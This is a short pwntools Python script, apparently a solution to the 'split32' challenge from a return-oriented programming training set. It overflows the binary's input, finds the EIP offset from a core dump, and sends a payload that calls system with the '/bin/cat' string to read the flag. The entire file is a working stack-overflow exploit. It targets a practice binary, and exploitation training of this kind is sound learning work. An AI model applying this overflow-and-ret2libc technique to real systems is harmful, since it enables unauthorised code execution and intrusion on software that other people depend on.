#!/usr/bin/env python3

from pwn import *

exe = ELF("./split32_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    system = exe.symbols.system
    bincat = next(exe.search(b'/bin/cat'))
    payload = cyclic(100)

    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip_value = core.eip
    eip_offset = cyclic_find(eip_value)

    r = conn()
    payload = flat(b'A'*eip_offset + p32(system) + p32(0x0) + p32(bincat))
    r.sendlineafter(b'>', payload)
    
    r.recv()
    r.recv()
    flag = r.readline()
    print(flag)

if __name__ == "__main__":
    main()
